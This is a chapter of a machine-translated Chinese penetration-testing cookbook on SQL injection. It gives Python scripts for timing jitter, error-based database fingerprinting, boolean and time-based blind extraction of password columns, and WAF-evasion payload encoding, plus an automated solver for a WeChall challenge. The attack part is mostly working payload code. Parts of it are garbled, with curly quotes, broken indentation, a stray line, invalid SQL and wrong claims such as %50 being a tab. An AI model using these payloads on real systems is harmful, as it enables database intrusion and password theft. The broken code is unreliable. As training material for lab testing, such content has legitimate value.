# 第四章。SQL 注入

在本章中，我们将涵盖以下主题：

+   检查抖动

+   识别基于 URL 的 SQLi

+   利用布尔 SQLi

+   利用盲目 SQLi

+   编码有效载荷

# 介绍

SQL 注入是一种吵闹的攻击，在你看到的每个与技术相关的媒体提供商中都会被强调。这是最常见和最具破坏性的攻击之一，继续在新的安装中蓬勃发展。本章重点介绍执行和支持 SQL 注入攻击。我们将创建编码攻击字符串的脚本，执行攻击，并计时正常操作以规范化攻击时间。

# 检查抖动

执行基于时间的 SQL 注入的唯一困难之处在于无处不在的游戏玩家的灾难，即延迟。人类可以轻松地坐下来，心理上考虑延迟，获取一系列返回的值，并明智地检查输出并计算出*cgris*是*chris*。对于机器来说，这要困难得多；因此，我们应该尝试减少延迟。

我们将创建一个脚本，该脚本向服务器发出多个请求，记录响应时间，并返回平均时间。然后可以用来计算时间攻击中响应波动，这种攻击被称为**抖动**。

## 如何做…

确定您希望攻击的 URL，并通过`sys.argv`变量提供给脚本：

```py
import requests
import sys
url = sys.argv[1]

values = []

for i in xrange(100): 
  r = requests.get(url)
  values.append(int(r.elapsed.total_seconds()))

average = sum(values) / float(len(values))
print “Average response time for “+url+” is “+str(average)
```

使用此脚本时产生的输出示例如下：

![如何做…](img/B04044_04_01.jpg)

## 工作原理…

我们导入了这个脚本所需的库，就像我们在本书中做的其他脚本一样。我们将计数器`I`设置为零，并创建一个空列表，用于我们即将生成的时间：

```py
while i < 100:
  r = requests.get(url)
  values.append(int(r.elapsed.total_seconds()))
  i = i + 1
```

使用计数器`I`，我们向目标 URL 运行`100`个请求，并将请求的响应时间附加到我们之前创建的列表中。`R.elapsed`是一个`timedelta`对象，而不是整数，因此必须使用`.total_seconds()`调用它，以便获得我们后来平均值的可用数字。然后我们将计数器加一，以便在此循环中计数，并使脚本适当地结束：

```py
average = sum(values) / float(len(values))
print “Average response time for “+url+” is “+average
```

循环完成后，我们通过使用`sum`计算列表的总值并使用`len`除以列表中的值来计算`100`个请求的平均值。

然后我们返回一个基本的输出，以便理解。

## 还有更多…

这是执行此操作的一种非常基本的方式，实际上只是作为一个独立的脚本来证明一个观点。要作为另一个脚本的一部分执行，我们将执行以下操作：

```py
import requests
import sys

input = sys.argv[1]

def averagetimer(url):

  i = 0
  values = []

  while i < 100:
    r = requests.get(url)
    values.append(int(r.elapsed.total_seconds()))
    i = i + 1

  average = sum(values) / float(len(values))
  return average

averagetimer(input)
```

# 识别基于 URL 的 SQLi

因此，我们之前已经看过 XSS 和错误消息的模糊处理。这一次，我们做的是类似的事情，但是用 SQL 注入代替。任何 SQLi 的关键都始于一个单引号，勾号或撇号，取决于您个人选择的单词。我们将一个撇号扔进目标 URL 中，并检查响应，以查看如果成功，正在运行的 SQL 版本是什么。

我们将创建一个脚本，将基本的 SQL 注入字符串发送到我们的目标 URL，记录输出，并与错误消息中已知的短语进行比较，以识别底层系统。

## 如何做…

我们将使用的脚本如下：

```py
import requests

url = “http://127.0.0.1/SQL/sqli-labs-master/Less-1/index.php?id=”
initial = “'”
print “Testing “+ url
first = requests.post(url+initial)

if “mysql” in first.text.lower(): 
  print “Injectable MySQL detected”
elif “native client” in first.text.lower():
  print “Injectable MSSQL detected”
elif “syntax error” in first.text.lower():
  print “Injectable PostGRES detected”
elif “ORA” in first.text.lower():
  print “Injectable Oracle detected”
else:
  print “Not Injectable J J”
```

使用此脚本时产生的输出示例如下：

```py
Testing http://127.0.0.1/SQL/sqli-labs-master/Less-1/index.php?id=
Injectable MySQL detected

```

## 工作原理…

我们导入我们的库并手动设置我们的 URL。如果需要，我们可以将其设置为`sys.argv`变量；但是，我在这里将其硬编码为了显示预期的格式。我们将初始注入字符串设置为单引号，并打印测试正在开始：

```py
url = “http://127.0.0.1/SQL/sqli-labs-master/Less-1/index.php?id=”
initial = “'”
print “Testing “+ url
```

我们将我们的第一个请求作为我们提供的 URL 和撇号：

```py
first = requests.post(url+initial)
```

接下来的几行是我们的检测方法，用于识别底层数据库是什么。MySQL 标准错误是：

```py
You have an error in your SQL syntax; check the manual
that corresponds to your MySQL server version for the
right syntax to use near '\'' at line 1

```

相应地，我们的检测尝试读取响应文本，并搜索`MySQL`字符串，如果成功，则打印出尝试成功：

```py
if “mysql” in first.text.lower(): 
  print “Injectable MySQL detected”
```

对于 MS SQL，一个示例错误消息是：

```py
Microsoft SQL Native Client error '80040e14'
Unclosed quotation mark after the character string

```

由于存在多个潜在的错误消息，我们需要确定尽可能多的错误消息中发生的一个常量。为此，我选择了`native client`，尽管`Microsoft SQL`也可以使用：

```py
elif “native client” in first.text.lower():
  print “Injectable MSSQL detected”
```

PostgreSQL 的标准错误消息是：

```py
Query failed: ERROR: syntax error at or near
“'” at character 56 in /www/site/test.php on line 121.

```

有趣的是，对于 SQL 中总是语法错误的情况，唯一经常使用`syntax`一词的解决方案是`PostGRES`，这使我们可以将其用作区分词：

```py
elif “syntax error” in first.text.lower():
  print “Injectable PostGRES detected”
```

我们检查的最后一个系统是 Oracle。Oracle 的一个示例错误消息是：

```py
ORA-00933: SQL command not properly ended

```

ORA 是大多数 Oracle 错误的前缀，因此可以在这里用作标识符。只有少数边缘情况下，非 ORA 错误消息会应用于尾随的单引号：

```py
elif “ORA” in first.text.lower():
  print “Injectable Oracle detected”
```

如果以上情况都不适用，我们有一个最终的`else`语句，声明参数不可注入，并且在选择该参数时出错。

以下是示例输出的屏幕截图：

![它是如何工作的...](img/B04044_04_02.jpg)

## 还有更多...

将此脚本与第一章中找到的蜘蛛联系起来，*收集开源情报*，将成为识别网页上可注入 URL 的快速高效方法。在大多数情况下，需要一种识别要注入的参数的方法，这可以通过简单的正则表达式操作来实现。

Audi-1 制作了一组有用的 SQLi 测试页面，可以在[`github.com/Audi-1/sqli-labs`](https://github.com/Audi-1/sqli-labs)找到。

# 利用布尔 SQLi

有时你只能从页面上得到一个是或否的答案。当你意识到这就是 SQL 等价于说“我爱你”的时候，这是令人心碎的。所有的 SQLi 都可以分解成是或否的问题，取决于你的耐心。

我们将创建一个脚本，它接受一个`yes`值和一个 URL，并根据预定义的攻击字符串返回结果。我提供了一个示例攻击字符串，但这将根据您正在测试的系统而变化。

## 如何做...

以下脚本是您的脚本应该的样子：

```py
import requests
import sys

yes = sys.argv[1]

i = 1
asciivalue = 1

answer = []
print “Kicking off the attempt”

payload = {'injection': '\'AND char_length(password) = '+str(i)+';#', 'Submit': 'submit'}

while True:
  req = requests.post('<target url>' data=payload)
  lengthtest = req.text
  if yes in lengthtest:
    length = i
    break
  else:
    i = i+1

for x in range(1, length):
  while asciivalue < 126:
payload = {'injection': '\'AND (substr(password, '+str(x)+', 1)) = '+ chr(asciivalue)+';#', 'Submit': 'submit'}
      req = requests.post('<target url>', data=payload)
      if yes in req.text:
    answer.append(chr(asciivalue))
break
  else:
      asciivalue = asciivalue + 1
      pass
asciivalue = 0
print “Recovered String: “+ ''.join(answer)
```

## 它是如何工作的...

首先，用户必须识别仅在 SQLi 成功时发生的字符串。或者，可以修改脚本以响应 SQLi 失败的证据缺失。我们将此字符串作为`sys.argv`变量提供。我们还创建了我们将在此脚本中使用的两个迭代器，并将它们设置为`1`，因为 MySQL 从`1`开始计数，而不是像失败的系统那样从`0`开始。我们还为我们未来的答案创建了一个空列表，并告知用户脚本正在启动：

```py
yes = sys.argv[1]

i = 1
asciivalue = 1
answer = []
print “Kicking off the attempt”
```

我们的有效载荷基本上请求我们试图返回的密码长度，并将其与将要迭代的值进行比较：

```py
payload = {'injection': '\'AND char_length(password) = '+str(i)+';#', 'Submit': 'submit'}
```

然后我们永远重复下一个循环，因为我们不知道密码有多长。我们将有效载荷提交到目标 URL 以进行`POST`请求：

```py
while True:
  req = requests.post('<target url>' data=payload)
```

每次检查我们最初设置的`yes`值是否出现在响应文本中，如果是，我们结束`while`循环，将`i`的当前值设置为参数长度。`break`命令是结束`while`循环的部分：

```py
lengthtest = req.text
  if yes in lengthtest:
    length = i
    break
```

如果我们没有检测到`yes`值，我们将`i`加`1`并继续循环：

```py
Ard.
else:
    i = i+1
```

使用目标字符串的已识别长度，我们遍历每个字符，并使用`asciivalue`，每个可能的字符值。对于每个值，我们将其提交到目标 URL。因为 ascii 表只运行到`127`，我们将循环限制到`asciivalue`达到`126`为止。如果达到`127`，则出现了问题：

```py
for x in range(1, length):
  while asciivalue < 126:
payload = {'injection': '\'AND (substr(password, '+str(x)+', 1)) = '+ chr(asciivalue)+';#', 'Submit': 'submit'}
    req = requests.post('<target url>', data=payload)
```

我们检查我们的是字符串是否出现在响应中，如果是，就跳转到下一个字符。我们将成功的消息以字符形式附加到我们的答案字符串中，并使用`chr`命令进行转换：

```py
if yes in req.text:
    answer.append(chr(asciivalue))
break
```

如果`yes`值不存在，我们将`asciivalue`添加到移动到下一个可能的字符位置并通过：

```py
else:
      asciivalue = asciivalue + 1
      pass
```

最后，我们为每个循环重置`asciivalue`，然后当循环达到字符串的长度时，我们完成，打印整个恢复的字符串：

```py
asciivalue = 1
print “Recovered String: “+ ''.join(answer)
```

## 还有更多...

潜在地，这个脚本可以被修改以处理遍历表并通过更好设计的 SQL 注入字符串恢复多个值。最终，这提供了一个基础，就像后来的盲目 SQL 注入脚本一样，用于开发更复杂和令人印象深刻的脚本来处理具有挑战性的任务。查看*利用盲目 SQL 注入*脚本，了解这些概念的高级实现。

# 利用盲目 SQL 注入

有时候，生活会给你柠檬；盲目的 SQL 注入点就是其中之一。当你相当确定已经找到了 SQL 注入漏洞，但没有错误，也无法让它返回你的数据时，在这些情况下，你可以在 SQL 中使用时间命令来导致页面暂停返回响应，然后利用这个时间来判断数据库及其数据。

我们将创建一个脚本，向服务器发出请求，并根据请求的字符返回不同时间的响应。然后它将读取这些时间并重新组装字符串。

## 如何做…

脚本如下：

```py
import requests

times = []
print “Kicking off the attempt”
cookies = {'cookie name': 'Cookie value'}

payload = {'injection': '\'or sleep char_length(password);#', 'Submit': 'submit'}
req = requests.post('<target url>' data=payload, cookies=cookies)
firstresponsetime = str(req.elapsed.total_seconds)

for x in range(1, firstresponsetime):
  payload = {'injection': '\'or sleep(ord(substr(password, '+str(x)+', 1)));#', 'Submit': 'submit'}
  req = requests.post('<target url>', data=payload, cookies=cookies)
  responsetime = req.elapsed.total_seconds
  a = chr(responsetime)
    times.append(a)
    answer = ''.join(times)
print “Recovered String: “+ answer
```

## 它是如何工作的…

和往常一样，我们导入所需的库并声明我们需要稍后填充的列表。我们还在这里有一个函数，说明脚本确实已经开始。在某些基于时间的函数中，用户可能需要等待一段时间。在这个脚本中，我还使用了`request`库来包含 cookies。对于这种攻击，可能需要进行身份验证：

```py
times = []
print “Kicking off the attempt”
cookies = {'cookie name': 'Cookie value'}
```

我们在字典中设置了我们的有效载荷以及一个提交按钮。攻击字符串足够简单，通过一些解释就可以理解。初始的撇号必须被转义为字典内的文本。该撇号最初中断了 SQL 命令，并允许我们输入自己的 SQL 命令。接下来，我们说在第一个命令失败的情况下，执行以下命令与`OR`。然后，我们告诉服务器为密码列中第一行中的每个字符休眠一秒。最后，我们用分号关闭语句，并用井号（或者如果你是美国人和/或错误的话，用英镑）注释掉任何尾随字符：

```py
payload = {'injection': '\'or sleep char_length(password);#', 'Submit': 'submit'}
```

然后我们将服务器响应所花费的时间长度设置为`firstreponsetime`参数。我们将使用这个参数来理解我们需要通过这种方法暴力破解多少个字符：

```py
firstresponsetime = str(req.elapsed).total_seconds
```

我们创建一个循环，将`x`设置为从标识的字符串的长度为`1`到所有数字，并对每个数字执行一个操作。我们从这里开始是因为 MySQL 从`1`开始计数，而不是像 Python 一样从零开始：

```py
for x in range(1, firstresponsetime):
```

我们制作了一个类似之前的有效载荷，但这次我们说在密码列的密码的第一个字符的 ascii 值处休眠。因此，如果第一个字符是小写 a，那么对应的 ascii 值是 97，因此系统会休眠 97 秒。如果是小写 b，它将休眠 98 秒，依此类推：

```py
payload = {'injection': '\'or sleep(ord(substr(password, '+str(x)+', 1)));#', 'Submit': 'submit'}
```

我们每次为字符串中的每个字符位置提交我们的数据。

```py
req = requests.post('<target url>', data=payload, cookies=cookies)
```

我们获取每个请求的响应时间，记录服务器休眠的时间，然后将该时间从 ascii 值转换回字母：

```py
responsetime = req.elapsed.total_seconds
  a = chr(responsetime)
```

对于每次迭代，我们打印出当前已知的密码，然后最终打印出完整的密码：

```py
answer = ''.join(times)
print “Recovered String: “+ answer
```

## 还有更多...

这个脚本提供了一个可以适应许多不同情况的框架。Wechall，这个网站挑战网站，设置了一个有时间限制的盲目 SQLi 挑战，必须在很短的时间内完成。以下是我们的原始脚本，已经适应了这个环境。正如你所看到的，我不得不考虑到不同值的较小时间差异和服务器延迟，并且还包括了一个检查方法，每次重置测试值并自动提交它：

```py
import subprocess
import requests

def round_down(num, divisor):
    return num - (num%divisor)

subprocess.Popen([“modprobe pcspkr”], shell=True)
subprocess.Popen([“beep”], shell=True)

values = {'0': '0', '25': '1', '50': '2', '75': '3', '100': '4', '125': '5', '150': '6', '175': '7', '200': '8', '225': '9', '250': 'A', '275': 'B', '300': 'C', '325': 'D', '350': 'E', '375': 'F'}
times = []
answer = “This is the first time”
cookies = {'wc': 'cookie'}
setup = requests.get ('http://www.wechall.net/challenge/blind_lighter/index .php?mo=WeChall&me=Sidebar2&rightpanel=0', cookies=cookies)
y=0
accum=0

while 1:
  reset = requests.get('http://www.wechall.net/challenge/blind_lighter/ index.php?reset=me', cookies=cookies)
  for line in reset.text.splitlines():
    if “last hash” in line:
      print “the old hash was:”+line.split(“ “)[20].strip(“.</li>”)
      print “the guessed hash:”+answer
      print “Attempts reset \n \n”
    for x in range(1, 33):
      payload = {'injection': '\'or IF (ord(substr(password, '+str(x)+', 1)) BETWEEN 48 AND 57,sleep((ord(substr(password, '+str(x)+', 1))- 48)/4),sleep((ord(substr(password, '+str(x)+', 1))- 55)/4));#', 'inject': 'Inject'}
      req = requests.post ('http://www.wechall.net/challenge/blind_lighter/ index.php?ajax=1', data=payload, cookies=cookies)
      responsetime = str(req.elapsed)[5]+str(req.elapsed)[6]+str(req.elapsed)[8]+ str(req.elapsed)[9]
      accum = accum + int(responsetime)
      benchmark = int(15)
      benchmarked = int(responsetime) - benchmark
      rounded = str(round_down(benchmarked, 25))
      if rounded in values:
        a = str(values[rounded])
        times.append(a)
        answer = ''.join(times)
      else:
        print rounded
        rounded = str(“375”)
        a = str(values[rounded])
        times.append(a)
        answer = ''.join(times)
  submission = {'thehash': str(answer), 'mybutton': 'Enter'}
  submit = requests.post('http://www.wechall.net/challenge/blind_lighter/ index.php', data=submission, cookies=cookies)
  print “Attempt: “+str(y)
  print “Time taken: “+str(accum)
  y += 1
  for line in submit.text.splitlines():
    if “slow” in line:
      print line.strip(“<li>”)
    elif “wrong” in line:
      print line.strip(“<li>”)
  if “wrong” not in submit.text:
    print “possible success!”
    #subprocess.Popen([“beep”], shell=True)
```

# 编码有效载荷

阻止 SQL 注入的一种方法是通过服务器端文本操作或**Web 应用程序防火墙**（**WAFs**）进行过滤。这些系统针对与攻击常见相关的特定短语，如`SELECT`，`AND`，`OR`和空格。这些可以通过用不太明显的值替换这些值来轻松规避，从而突显了黑名单的一般问题。

我们将创建一个脚本，该脚本接受攻击字符串，查找潜在的转义字符串，并提供替代的攻击字符串。

## 如何做…

以下是我们的脚本：

```py
subs = []
values = {“ “: “%50”, “SELECT”: “HAVING”, “AND”: “&&”, “OR”: “||”}
originalstring = “' UNION SELECT * FROM Users WHERE username = 'admin' OR 1=1 AND username = 'admin';#”
secondoriginalstring = originalstring
for key, value in values.iteritems():
  if key in originalstring:
    newstring = originalstring.replace(key, value)
    subs.append(newstring)
  if key in secondoriginalstring:
    secondoriginalstring = secondoriginalstring.replace(key, value)
    subs.append(secondoriginalstring)

subset = set(subs)
for line in subs:
  print line
```

以下截图是使用此脚本时产生的输出的示例：

![如何做…](img/B04044_04_03.jpg)

## 它是如何工作的…

这个脚本不需要任何库！真是令人震惊！我们为即将创建的值创建一个空列表，并创建一个意图添加的替代值的字典。我放了五个示例值。空格和`%20`通常被 WAFs 转义，因为 URL 通常不包括空格，除非请求了不当的内容。

更具体地说，调整过的系统可能会避开 SQL 特定词语，比如`SELECT`，`AND`和`OR`。这些都是非常基本的值，可以根据需要添加或替换：

```py
subs = []
values = {“ “: “%50”, “%20”: “%50”, “SELECT”: “HAVING”, “AND”: “&&”, “OR”: “||”}
```

我已经将原始字符串硬编码为示例，这样我们就可以看到它是如何工作的。我已经包含了一个包含上述所有值的有效 SQLi 字符串，以证明它的用法：

```py
originalstring = “'%20UNION SELECT * FROM Users WHERE username = 'admin' OR 1=1 AND username = 'admin';#”
```

我们创建原始字符串的第二个版本，以便我们可以为每个替换创建一个累积结果和一个独立结果：

```py
secondoriginalstring = originalstring
```

我们依次取每个字典项，并将每个键和值分配给参数键和值：

```py
for key, value in values.iteritems():
```

我们查看初始术语是否存在，如果存在，则用键值替换它。例如，如果存在空格，我们将用`%50`替换它，这是 URL 编码的制表符字符：

```py
if key in originalstring:
    newstring = originalstring.replace(key, value)
```

这个字符串，在每次迭代时，都会重置为我们在脚本开头设置的原始值。然后我们将该字符串添加到之前创建的列表中：

```py
subs.append(newstring)
```

我们执行与之前相同的操作，使用迭代字符串来创建一个多次编码的版本：

```py
if key in secondoriginalstring:
    secondoriginalstring = secondoriginalstring.replace(key, value)
    subs.append(secondoriginalstring)
```

最后，我们通过将其转换为集合使列表变得唯一，并逐行将其返回给用户：

```py
subset = set(subs)
for line in subs:
  print line
```

## 还有更多…

同样，这可以成为一个内部函数，而不是作为独立脚本使用。也可以通过使用以下脚本来实现：

```py
def encoder(string):

subs = []
values = {“ “: “%50”, “SELECT”: “HAVING”, “AND”: “&&”, “OR”: “||”}
originalstring = “' UNION SELECT * FROM Users WHERE username = 'admin' OR 1=1 AND username = 'admin'”
secondoriginalstring = originalstring
for key, value in values.iteritems():
  if key in originalstring:
    newstring = originalstring.replace(key, value)
    subs.append(newstring)
  if key in secondoriginalstring:
    secondoriginalstring = secondoriginalstring.replace(key, value)
    subs.append(secondoriginalstring)

subset = set(subs)
return subset
```
